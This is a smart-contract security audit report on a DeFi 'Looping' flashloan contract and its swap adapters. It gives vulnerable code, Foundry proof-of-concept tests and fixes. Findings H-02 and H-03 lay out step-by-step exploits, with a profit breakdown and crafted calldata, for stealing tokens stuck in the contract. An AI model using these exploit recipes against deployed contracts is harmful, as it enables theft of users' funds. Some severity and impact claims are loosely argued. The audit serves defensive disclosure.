# Looping Protocol Security Audit Report

**Protocol Name:**  
Solidity - 1 -> Looping Contract

**Auditor:**  
Himanshu

**Email:**  
ydvhimanshu772005@gmail.com

**Discord Username:**  
himanshu0925

---

## [H-01] In the Contract `Looping.sol` function `closePosition` with `withdrawAmount == type(uint256).max` reliably reverts due to accrued compound interest mismatch

### Summary
When a user attempts to completely exit their leveraged position using standard convention (`withdrawAmount == type(uint256).max`), the transaction will nearly always revert. This is caused by a mathematically mismatch between the fixed flashloan size requested to execute the closure, and the dynamic debt calculated at block inclusion. (Debt increase because of the interest)

### Vulnerable Code Spec
**`Looping.sol` Lines 117-119 & 208-217:**
```solidity
    function closePosition(
        address _pool, 
        address _swapper,
        address _debtAsset, 
        address _yieldAsset, 
        uint256 _flashloanAmount, 
        uint256 _minAmountOut,
        address[] memory _path,
        uint256 _withdrawAmount,
        uint256 _deadline
    ) external nonReentrant() {
        require(pools[_pool], "pool not allowed");

        //transfer any funds accidentally sent/stuck in the contract to the owner first
        _refund(_debtAsset, _yieldAsset, 0, 0, owner());

        //use flashloan to borrow _debtAsset
@>        bytes memory params = abi.encode(1, _yieldAsset, _swapper, _path, _flashloanAmount, _minAmountOut, msg.sender, _withdrawAmount, _deadline);
        IPool(_pool).flashLoanSimple(address(this), _debtAsset, _flashloanAmount, params, 0);
    }
```
This line only read the Static amount of the `_flashloanAmount`

```solidity
    function _executeClosePosition(bytes memory params, address debtAsset) internal {
        (
            , //action type
            address yieldAsset, 
            address swapper, 
            address[] memory path, 
            uint256 repaymentAmount, 
            uint256 minAmountOut,
            address user,
            uint256 withdrawAmount,
            uint256 deadline
        ) = abi.decode(params, (uint8, address, address, address[], uint256, uint256, address, uint256, uint256));

        IERC20 hYieldToken = IERC20(IPool(msg.sender).getReserveData(yieldAsset).aTokenAddress);

        //close full position if repaymentAmount == maxUint256
@>        if (withdrawAmount == type(uint256).max){
            IERC20 debtDebtToken = IERC20(IPool(msg.sender).getReserveData(debtAsset).variableDebtTokenAddress);
            repaymentAmount = debtDebtToken.balanceOf(user);
            withdrawAmount = hYieldToken.balanceOf(user);
        }

        //repay debt, note: msg.sender is now the lending pool
        IERC20(debtAsset).safeIncreaseAllowance(msg.sender, repaymentAmount);
@>        IPool(msg.sender).repay(debtAsset, repaymentAmount, 2, user);

        //get address of the hToken and transfer it from user, so we can withdraw it
        hYieldToken.safeTransferFrom(user, address(this), withdrawAmount);

        //withdraw yield token
        IPool(msg.sender).withdraw(yieldAsset, withdrawAmount, address(this));

        //swap yield token to debt token
        _swap(swapper, path, withdrawAmount, minAmountOut, deadline);
    }
```

When a user opens a leveraged position, they accrue dynamic compound interest every second on their `variableDebtToken` balance. However, the `closePosition` function is fundamentally built requiring the user to pass `_flashloanAmount` as a **static** integer calculated off-chain before the transaction is mined. 


### Attack Vector:
The vulnerability lies in the nature of Aave's Flashloan callbacks and Aave's algorithmic interest generation.

- A user looking to close 100% of their position queries Aave's frontend. Their current dynamic debt is exactly `10,000 USDC`. 
- The user signs `closePosition(...)` explicitly passing `_flashloanAmount = 10000e6` alongside `withdrawAmount = type(uint256).max`.
- The transaction enters the Ethereum Mempool. During the 12 seconds it takes to mine the block, Aave's interest-bearing algorithm increments the user's active debt to `10,000.0005 USDC`. 
- The transaction begins execution. `Looping.sol` successfully requests and receives a static flashloan of `10,000 USDC` from Aave because it rigidly passes the stale `_flashloanAmount` variable inside `flashLoanSimple()`.
- Inside the `_executeClosePosition` callback, the function hits the `withdrawAmount == type(uint256).max` check. Because it is a maximum exit, the contract actively fetches the **true, current** debt balance from Aave: 
   `repaymentAmount = debtDebtToken.balanceOf(user)` *(Which is now 10,000.0005 USDC).*
- The contract finishes swapping collateral and attempts to repay the flashloan dynamically using `repaymentAmount + premium`. 
   * It asks Aave to pull `10,000.0005 USDC` from the `Looping.sol` address.
   * Because the static flashloan only funded the contract with `10,000.0000 USDC`, the token `.transferFrom` strictly fails due to an **Insufficient Balance** deficit of `0.0005 USDC`.



## POC 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Looping} from "../contracts/Looping.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Simple mock ERC20 that reverts natively on insufficient balance
contract MockToken is IERC20 {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
    
    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balances[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        require(allowances[from][msg.sender] >= amount, "ERC20: insufficient allowance");
        balances[from] -= amount;
        balances[to] += amount;
        allowances[from][msg.sender] -= amount;
        return true;
    }
    
    function balanceOf(address account) external view override returns (uint256) { return balances[account]; }
    function approve(address spender, uint256 amount) external override returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }
    function allowance(address owner, address spender) external view override returns (uint256) { return allowances[owner][spender]; }
    function totalSupply() external view override returns (uint256) { return 0; }
}

// Struct matching Aave V3 ReserveData to neatly format our mock return!
struct ReserveData {
    uint256 configuration;
    uint128 liquidityIndex;
    uint128 currentLiquidityRate;
    uint128 variableBorrowIndex;
    uint128 currentVariableBorrowRate;
    uint128 currentStableBorrowRate;
    uint40 lastUpdateTimestamp;
    uint16 id;
    address aTokenAddress;
    address stableDebtTokenAddress;
    address variableDebtTokenAddress;
    address interestRateStrategyAddress;
    uint128 accruedToTreasury;
    uint128 unbacked;
    uint128 isolationModeTotalDebt;
}

contract MockDebtToken {
    uint256 public dynamicBalance;

    function setDynamicBalance(uint256 _balance) external {
        dynamicBalance = _balance;
    }

    // This simulates the fluctuating interest rate in Aave
    function balanceOf(address) external view returns (uint256) {
        return dynamicBalance;
    }
}

contract MockAToken {
    function balanceOf(address) external pure returns (uint256) {
        return 5000e18; // Fake yield
    }
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract MockPoolH01 {
    // 1. Give the flashloan
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 /*referralCode*/
    ) external {
        // Send the flashloan amount exactly requested!
        MockToken(asset).mint(address(this), amount);
        MockToken(asset).transfer(receiverAddress, amount);
        
        // Execute Receiver
        (bool success, bytes memory ret) = receiverAddress.call(
            abi.encodeWithSignature(
                "executeOperation(address,uint256,uint256,address,bytes)",
                asset, amount, 0, msg.sender, params // premium = 0 for simplicity
            )
        );
        assembly {
            if iszero(success) {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }

    // 2. Aave's repay logic
    function repay(address asset, uint256 amount, uint256 /*rateMode*/, address /*onBehalfOf*/) external returns (uint256) {
        // Aave pulls the dynamic debt repayment heavily!
        // THIS WILL REVERT because Looping.sol lacks the generated interest!
        MockToken(asset).transferFrom(msg.sender, address(this), amount);
        return amount;
    }

    // Mock withdraw to ignore for this test
    function withdraw(address, uint256, address) external pure returns (uint256) { return 0; }
}

contract PoCH01 is Test {
    Looping looping;
    MockPoolH01 mockPool;
    MockToken debtToken;
    MockToken yieldToken;

    MockDebtToken variableDebtToken;
    MockAToken aToken;
    
    address user = address(0x1337);

    function setUp() public {
        debtToken = new MockToken();
        yieldToken = new MockToken();
        mockPool = new MockPoolH01();

        variableDebtToken = new MockDebtToken();
        aToken = new MockAToken();

        address[] memory pools = new address[](1);
        pools[0] = address(mockPool);

        address[] memory swappers = new address[](1);
        swappers[0] = address(0x999); // Dump Swapper

        looping = new Looping(pools, swappers, address(this));

        // Let's use vm.mockCall to securely bypass IPool.getReserveData!
        ReserveData memory mockDebtReserve;
        mockDebtReserve.variableDebtTokenAddress = address(variableDebtToken);
        vm.mockCall(
            address(mockPool),
            abi.encodeWithSignature("getReserveData(address)", address(debtToken)),
            abi.encode(mockDebtReserve)
        );

        ReserveData memory mockYieldReserve;
        mockYieldReserve.aTokenAddress = address(aToken);
        vm.mockCall(
            address(mockPool),
            abi.encodeWithSignature("getReserveData(address)", address(yieldToken)),
            abi.encode(mockYieldReserve)
        );
    }

    function testClosePositionRevertMempoolInterest() public {
        vm.startPrank(user);

        // 1. User calculates statically what they owe based on Aave's CURRENT block
            // They owe EXACTLY 10,000 WETH and request exactly that much capital to execute the closure
        uint256 staticallyCalculatedDebt = 10000 ether; 

            // 2. However, a single block passes in the Mempool while transaction waits to be mined!
            // Aave's interest algorithms increment the true user's debt on-chain natively
            uint256 dynamicallyAccruedDebt = 10000 ether + 50000; // Accrued dust interest
            
            // We mock Aave reporting the true slightly higher debt!
        variableDebtToken.setDynamicBalance(dynamicallyAccruedDebt);

            // Dummy path
            address[] memory path = new address[](2);
            path[0] = address(yieldToken);
            path[1] = address(debtToken);

            // 3. User submits transaction
            // EXPECT REVERT DUE TO STRICT FLASHLOAN MISMATCH!!
        vm.expectRevert("ERC20: transfer amount exceeds balance");

        looping.closePosition(
            address(mockPool),
                address(0x999),          // dummy swapper
                address(debtToken),      // WETH
                address(yieldToken),     // USDC
                staticallyCalculatedDebt,// _flashloanAmount -> User statically asks for 10000.00e18!
                0,                       // minAmountOut
            path,
                type(uint256).max,       // Trigger the type(uint256).max Full Closure bug!
            block.timestamp + 100
        );

            console.log("Exploit successfully proved the transaction physically reverts!");
            console.log("Static Flashloan Received: ", staticallyCalculatedDebt);
            console.log("Dynamic Debt Repay Demanded:", dynamicallyAccruedDebt);

        vm.stopPrank();
    }
}

```

**Impact:** **High.** The "Close 100% Position" feature does not work. Users are forced to leave "dust" in Aave to exit, leading to an unusable protocol for full closure.

---

## [H-02] In the Contract `Looping.sol` due Arbitrary `path` array manipulation allows attackers to actively drain unrelated stuck tokens

### Summary
The `openPosition` function accepts `_debtAsset` and `_path` as completely independent parameters with **zero validation** that `path[0] == _debtAsset`. An attacker can set `path[0]` to any token stuck in the contract while using a cheap token (same decimal count) as `_debtAsset`. This lets them flashloan cheap tokens, swap expensive stuck tokens via the manipulated path, deposit the swap output as Aave collateral, borrow cheap debt to repay the flashloan, and pocket the value difference.

### Root Cause
**`Looping.sol` — No validation between `_debtAsset` and `path[0]`:**
```solidity
// openPosition() Line 117: flashloans _debtAsset (e.g. DAI)
IPool(_pool).flashLoanSimple(address(this), _debtAsset, _flashloanAmount, params, 0);

// _executeOpenPosition() Line 266: swaps path[0] (e.g. LINK — NOT debtAsset!)
uint256 yieldAmount = _swap(swapper, path, amount, minAmountOut, deadline);

// _swap() Line 371: blindly trusts path[0]
IERC20(path[0]).safeIncreaseAllowance(swapper, amountToSwap);
```

### Vulnerable Code Spec
**`Looping.sol` `_swap()` function Lines 362-389:**
```solidity
function _swap(address swapper, address[] memory path, uint256 amountToSwap...) internal returns (uint256) {
    // Blindly trusts the user's `path[0]` parameter
    // Fails to restrict or require that `path[0] == _debtAsset`
    IERC20(path[0]).safeIncreaseAllowance(swapper, amountToSwap);
    ISwapper(swapper).swapExactTokensForTokensSupportingFeeOnTransferTokens(...);
}
```

### Critical Constraint: Decimal Matching
The `amount` parameter passed to `_swap()` equals the flashloan amount **in raw token units**. The DEX pulls that same raw number of `path[0]` tokens. Therefore, the attacker must choose a `_debtAsset` with the **same decimal count** as the stuck token so the raw amounts align:

| Debt Asset | Decimals | Flashloan = 1000e18 raw | Dollar Cost | DEX Pulls (LINK 18-dec) | Works? |
|-----------|----------|-------------------------|-------------|------------------------|--------|
| **WETH** | 18 | 1000 WETH | $3,000,000 | 1000 LINK ($15K) | ❌ Aave LTV fails: borrow $2.7M vs $12K max |
| **DAI** | 18 | 1000 DAI | **$1,000** | 1000 LINK ($15K) | ✅ Aave LTV passes: borrow $905 vs $12K max |
| USDT | 6 | 1e12 USDT | impossible | — | ❌ Decimal mismatch |

### Exploit Calculation & Proof Of Concept

**Setup:** Someone accidentally sends 1,000 LINK ($15/LINK = $15,000 total, 18 decimals) to the Looping contract. Attacker sees this on-chain.

**Attacker calls `openPosition` with:**
| Parameter | Value | Reason |
|-----------|-------|--------|
| `_debtAsset` | DAI (18 decimals, $1) | Cheap token with same decimals as LINK |
| `_yieldAsset` | USDC | Receives swap output |
| `_path` | [LINK, USDC] | Manipulated — swaps stuck LINK, not DAI! |
| `_initialAmount` | 100e18 (100 DAI = $100) | Attacker's small upfront cost |
| `_flashloanAmount` | 1000e18 (1000 DAI = $1,000) | Raw units match 1000 LINK! |
| `_startWithYield` | false | — |

**Step-by-step execution with code context and token balances:**

| Step | Code Line | Code Context / Logic | Action Description | DAI Balance | LINK Balance | USDC Balance |
|:---:|:---:|:---|:---|:---:|:---:|:---:|
| **1** | **L72** | `_refund(_debtAsset, _yieldAsset, 0, 0, owner())` | **Whitelisted Sweep:** Sweeps only DAI/USDC. **LINK is ignored** and stays in contract. | 0 | **1000** | 0 |
| **2** | **L91** | `IERC20(_debtAsset).safeTransferFrom(msg.sender, address(this), _initialAmount)` | **Initial Deposit:** Attacker sends 100 DAI to the contract. | **100** | 1000 | 0 |
| **3** | **L105** | `uint256 repaymentAmount = _flashloanAmount - _initialAmount` | **Debt Math:** Sets static repayment target (1000 - 100 = 900). | 100 | 1000 | 0 |
| **4** | **L117** | `IPool(_pool).flashLoanSimple(address(this), _debtAsset, _flashloanAmount, ...)` | **Liquidity Influx:** Contract receives 1000 DAI flashloan from Aave. | **1100** | 1000 | 0 |
| **5** | **L266 / L371** | `IERC20(path[0]).safeIncreaseAllowance(swapper, amountToSwap)` | **The Hijack:** contract approves **LINK** (path[0]) for swap instead of DAI. DEX swaps 1000 LINK → 15k USDC. | 1100 | **0** | **15000** |
| **6** | **L278** | `IPool(msg.sender).supply(yieldAsset, yieldAmount, user, 0)` | **Collateralization:** 15k USDC is supplied to Aave to back **Attacker's** wallet. | 1100 | 0 | **0** |
| **7** | **L281** | `IPool(msg.sender).borrow(debtAsset, repaymentAmount + premium, ...)` | **Debt Lever:** Attacker borrows 905 DAI against the stolen USDC collateral. | **2005** | 0 | 0 |
| **8** | **L213** | `_refund(debtAsset, yieldAsset, amount, premium, user)` | **The Payday:** Contract sees 2005 DAI, subtracts 1005 debt. **Sends 1000 DAI profit** to Attacker. | **1005** | 0 | 0 |
| **9** | **L216** | `IERC20(debtAsset).safeIncreaseAllowance(msg.sender, amount + premium)` | **Cleanup:** Aave pulls the 1005 DAI to settle the original flashloan. | **0** | 0 | 0 |

**Step 7 — Aave LTV Check:**
```
Collateral deposited: 15,000 USDC = $15,000
Aave LTV:             80%
Max borrowable:       $15,000 × 0.80 = $12,000
Borrow requested:     905 DAI × $1 = $905

$905 < $12,000  →  ✅ BORROW SUCCEEDS
```

**Final Attacker Balance Sheet:**
| Item | Amount | Dollar Value |
|------|--------|-------------|
| **Spent** (initial DAI, Step 2) | −100 DAI | −$100 |
| **Received** (from _refund, Step 8) | +1,000 DAI | +$1,000 |
| **Aave collateral** (Step 6) | +15,000 USDC | +$15,000 |
| **Aave debt** (Step 7) | −905 DAI | −$905 |
| | | |
| **Wallet net** | +900 DAI | +$900 |
| **Aave net** (withdraw collateral, repay debt) | +15,000 USDC − 905 DAI | +$14,095 |
| **Total Profit** | | **≈ $14,995** |

The attacker spent $100 of their own money and **stole ≈$15,000** worth of stuck LINK.

**Impact:** **High.** Any ERC20 token accidentally sent to the Looping contract can be stolen by any external caller. The attacker monitors the contract balance on-chain, selects a cheap debt asset with matching decimals and calls `openPosition` with a manipulated `_path`. Zero protocol trust is required — only a whitelisted pool and swapper.

> [!NOTE]
> This attack is also fully functional when `_startWithYield == true`. In that execution branch, the contract calls `_swap` with `_reversePath(_path)` as the first step (Line 82). An attacker can simply reverse their manipulated path (e.g., `_path = [USDC, LINK]`) so that the reverse path matches the stuck token (`[LINK, USDC]`). The underlying vulnerability remains the same: the protocol blindly executes an allowance and swap on whatever token occupies `path[0]`.

**Recommended Fix:**
```solidity
// Add in _executeOpenPosition(), before _swap():
require(path[0] == debtAsset, "path[0] must be debtAsset");

// AND in openPosition(), inside the if(_startWithYield) block before _swap():
require(_reversePath(_path)[0] == yieldAsset, "path last element must be yieldAsset");
```

---

## [H-03] Blind Arbitrary Calldata Execution in `GluexAdapter.sol` - Direct Theft of Stuck Tokens

### Severity: High
**Location:** `contracts/periphery/GluexAdapter.sol`

### Summary
The `GluexAdapter` allows any external user to define the exact `bytes` payload (`gluexData`) that will be executed on the GlueX router. Because the protocol fails to validate the function selector or the output recipient (`to`) within this payload, an attacker can craft a transaction that instructs the router to send swap outputs or liquidity directly to their own wallet, bypassing the protocol's accounting while still utilizing the contract's approved balance.

### Root Cause
The `GluexAdapter.sol` blindly executes user-provided calldata:
```solidity
// GluexAdapter.sol Line 80
(bool success, ) = gluex.call(gluexCallData);
```
There is no validation that the `gluexCallData` targets a specific "swap" function or that the recipient of that action is the `GluexAdapter` contract itself.

### Exploit Scenario (Stolen Redirect)
An attacker can exploit this to divert "stuck" tokens identified in **H-02** directly to their wallet with zero slippage:
1. 1000 LINK is stuck in `Looping.sol`.
2. Attacker prepares a GlueX payload using the standard `ISwapper` signature, but sets the `to` (recipient) parameter to `AttackerAddress`.
3. Attacker calls `openPosition()` on `Looping.sol` with `path[0] = LINK` and `amountOutMin = 0`.
4. `Looping` approves 1000 LINK to `GluexAdapter`.
5. `GluexAdapter` executes the malicious payload (e.g., `swapExactTokensForTokensSupportingFeeOnTransferTokens`). The router pulls the 1000 LINK and sends the output directly to the Attacker.
6. `GluexAdapter` checks its own balance for slippage: `balanceOut (0) >= amountOutMin (0)`. Success.

### Proof of Concept (PoC)
```solidity
function testExploitGluexDirectTheft() public {
    // 1. Setup: 1000 LINK is stuck in Looping contract
    deal(address(link), address(looping), 1000e18);
    
    // 2. Attacker crafts a payload using the standard ISwapper signature
bytes memory maliciousData = abi.encodeWithSignature(
    "swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,address,uint256)",
        1000e18,            // amountIn
    0,                  // minAmountOut
    path,               // [LINK, USDC]
        attacker,           // to (THEFT REDIRECT!)
    address(0),         // referrer
    block.timestamp + 100
);

    // 3. Set the malicious path in transient storage
    gluexAdapter.setSwapPath(address(link), address(usdc), maliciousData);

    // 4. Trigger the exploit via openPosition
    looping.openPosition(
        pool,
        address(gluexAdapter),
        address(dai),
        address(usdc),
        0,          
        1000e18,    
        0,          
        path,       
        false,
        0,
        block.timestamp + 100
    );

    // 5. Result: Attacker received the stolen LINK directly from the router
    assertEq(link.balanceOf(attacker), 1000e18);
}
```

### Impact: **High**
By combining this with the arbitrary `path[0]` vulnerability, any whitelisted `GluexAdapter` becomes a high-speed drain for any asset the protocol accidentally holds. It bypasses Aave collateral requirements entirely.

### Recommended Fix
The `GluexAdapter` must decode the user-provided calldata and enforce that the `recipient` or `to` parameter is strictly set to `address(this)`.
```solidity
// Inside swap function:
// 1. Decode the standard swap signature to extract the 'to' address
(, , , address to, , ) = abi.decode(gluexCallData[4:], (uint256, uint256, address[], address, address, uint256));
require(to == address(this), "GluexAdapter: output must return to self");
```

---

## [M-01] Silent Logic Failure and Yield Lockup in `LiquidSwapAdapter.sol`

### Severity: Medium
**Location:** `contracts/periphery/LiquidSwapAdapter.sol`

### Summary
Some non-standard historical tokens fail logic queries by returning the boolean `false` instead of actively `reverting` EVM state. `LiquidSwapAdapter` incorrectly uses naive `.transfer` integrations, willfully stranding Yield. 

### Vulnerable Code Spec
**`LiquidSwapAdapter.sol` Line 80:**
```solidity
// VULNERABILITY: Does NOT check success return boolean.
IERC20(tokenOut).transfer(to, balanceOut); 
```

### Exploit Calculation & Proof Of Concept
1. A user rolls WETH into Yield token `ZRX` (which returns boolean errors instead of standard Solidity reverts on transfer friction).
2. The `LiquidSwap` executed 1000 WETH for 5000 ZRX cleanly. 
3. `LiquidSwapAdapter` calls `ZRX.transfer(Looping, 5000)`. Because of an underlying token pause or limit criteria, the contract blocks it, and returns `false`.
4. Because the wrapper lacks `SafeERC20`, EVM continues without crashing! `Looping.sol` physically receives `0 ZRX`. 
5. `Looping.sol` continues supplying `0 ZRX` collateral to Aave, dragging an unbacked recursive `1000 WETH` debt strictly against the user's primary health factor. 
6. The `5000 ZRX` remain permanently locked inside `LiquidSwapAdapter` completely unrecoverable!

---

## [M-02] ABI Decoder Denial of Service via Return Mismatches (USDT)

### Severity: Medium
**Location:** `contracts/periphery/LiquidSwapAdapter.sol` & `contracts/StrategyManager.sol`

### Summary
Because `IERC20` explicitly expects a boolean return to satisfy strict solidity ABI compilation, interaction with classic tokens that strictly return `void` (No data/Null) instantly causes internal EVM reversions, bricking routing and execution.

### Vulnerable Code Spec
**`StrategyManager.sol` Line 63:**
```solidity
// VULNERABILITY: Fails to wrap output rescue integration!
IERC20(tokens[i]).transfer(owner(), balance); 
```
**`LiquidSwapAdapter.sol` Line 60:**
```solidity
// VULNERABILITY: Directly requests an ABI response from purely Void contracts!
IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
```

### Exploit Calculation & Proof Of Concept
When a user accidentally deposits exactly `100 USDT` into their personal `StrategyManager` vault. They enthusiastically call `cleanOutTokens()` to execute a safety manual rescue. 
1. The contract executes `USDT.transfer(100)`.
2. USDT processes the tokens gracefully, but deliberately executes an `assembly { return(0, 0) }` (Returns zero data).
3. The Ethereum ABI decoding layer parses the returned byte signature looking explicitly for `true` / `false`. Realizing nothing was returned, the native compiler issues a strict logic `revert()` destroying the call execution frame entirely. 
4. The user is strictly denied sweeping access and permanently loses access to their active `USDT`!
